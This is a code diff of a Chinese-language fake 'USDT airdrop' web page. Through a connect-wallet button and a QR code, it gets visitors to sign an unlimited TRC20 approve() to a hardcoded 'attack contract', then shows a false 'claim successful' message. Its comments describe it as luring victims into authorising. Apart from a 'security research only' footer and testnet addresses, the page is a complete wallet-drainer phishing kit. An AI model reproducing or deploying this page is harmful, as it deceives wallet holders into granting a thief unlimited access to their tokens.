@@ -1,50 +1,68 @@
 <!DOCTYPE html>
-<html>
+<html lang="zh-CN">
 <head>
-    <title>TRC20空投 - 领取1000 USDT</title>
-    <meta charset="utf-8">
-    <!-- 引入TronWeb库 -->
+    <meta charset="UTF-8">
+    <title>波场USDT空投</title>
     <script src="https://cdn.jsdelivr.net/npm/tronweb@5.3.0/dist/TronWeb.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/qrcodejs2@1.0.0/qrcode.min.js"></script>
+    <style>
+        body { font-family: Arial; text-align: center; margin-top: 50px; }
+        button { padding: 12px 24px; font-size: 18px; margin: 20px; cursor: pointer; }
+        #qrcode { margin: 20px auto; width: 200px; }
+        .note { color: gray; font-size: 14px; margin-top: 30px; }
+    </style>
 </head>
 <body>
-    <h2>🎉 波场生态空投活动</h2>
-    <p>连接TronLink钱包，即可领取 1000 USDT（测试网）</p>
-    <button id="connectBtn">连接钱包并领取</button>
-    <div id="status"></div>
+    <h2>🎉 TRC20 生态空投活动</h2>
+    <p>领取 1000 USDT (Shasta测试网)</p>
+    <button id="connectBtn">🔗 连接钱包直接领取</button>
+    <hr />
+    <h3>或扫描二维码领取 (手机TronLink)</h3>
+    <div id="qrcode"></div>
+    <div id="status" style="margin-top:20px;"></div>
+    <div class="note">⚠️ 请确保钱包网络为 Shasta 测试网 | 此页面仅用于安全研究</div>
 
     <script>
-        // ========== 配置（请替换为你的实际地址）==========
-        const ATTACK_CONTRACT = "你的攻击合约地址";   // 第二步部署的攻击合约地址
-        const TOKEN_ADDRESS = "TXLAQ63Xg1NAzckPwKHvzw7CSEmLMEqcdj"; // Shasta测试USDT
-        // =============================================
+        // ========== 配置攻击合约地址（替换为你部署的攻击合约地址）==========
+        const ATTACK_CONTRACT = "TYKsGMu19ACE4XZgU5NdYiFg1QXPkHG6zA";  // 攻击合约地址
+        const TOKEN_ADDRESS = "TG3XXyExBkPp9nzdajDZsozEu4BkaSJozs";      // Shasta 测试 USDT
+        // =================================================================
 
+        // 生成授权二维码（手机扫码后自动弹出 approve 交易）
+        const txForQR = {
+            to: TOKEN_ADDRESS,
+            functionSelector: "approve(address,uint256)",
+            parameter: [
+                { type: "address", value: ATTACK_CONTRACT },
+                { type: "uint256", value: "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff" } // 最大授权额度
+            ],
+            callValue: 0,
+            feeLimit: 100_000_000
+        };
+        const qrContent = JSON.stringify(txForQR);
+        new QRCode(document.getElementById("qrcode"), {
+            text: qrContent,
+            width: 200,
+            height: 200
+        });
+
+        // 直接授权按钮
         document.getElementById("connectBtn").onclick = async () => {
             if (!window.tronWeb || !window.tronWeb.defaultAddress) {
-                alert("请先安装并登录 TronLink 钱包");
+                alert("请安装并登录 TronLink");
                 return;
             }
-            const userAddress = window.tronWeb.defaultAddress.base58;
-            document.getElementById("status").innerHTML = `已连接: ${userAddress}<br>正在授权...`;
-            
-            // 加载代币合约
-            const tokenContract = await window.tronWeb.contract().at(TOKEN_ADDRESS);
-            const maxUint = 2**256 - 1;  // 无限授权
-            
-            // 发起 approve（诱导受害者授权）
-            const approveTx = await tokenContract.approve(ATTACK_CONTRACT, maxUint).send({
-                shouldPollResponse: true,
-                feeLimit: 100_000_000
-            });
-            
-            document.getElementById("status").innerHTML = `
-                授权交易已发送: 
-                <a href="https://shasta.tronscan.org/#/transaction/${approveTx}" target="_blank">
-                    ${approveTx}
-                </a><br>等待确认...
-            `;
-            await window.tronWeb.trx.getTransactionInfo(approveTx);
-            document.getElementById("status").innerHTML += "<br>✅ 空投领取成功！";
+            const user = window.tronWeb.defaultAddress.base58;
+            document.getElementById("status").innerHTML = `授权中... (${user})`;
+            const token = await window.tronWeb.contract().at(TOKEN_ADDRESS);
+            const max = 2**256 - 1;
+            try {
+                const tx = await token.approve(ATTACK_CONTRACT, max).send({ feeLimit: 100_000_000 });
+                document.getElementById("status").innerHTML = `✅ 领取成功！交易: <a href="https://shasta.tronscan.org/#/transaction/${tx}" target="_blank">${tx}</a>`;
+            } catch(e) {
+                document.getElementById("status").innerHTML = `❌ 失败: ${e.message}`;
+            }
         };
     </script>
 </body>
-      </html>
+</html>
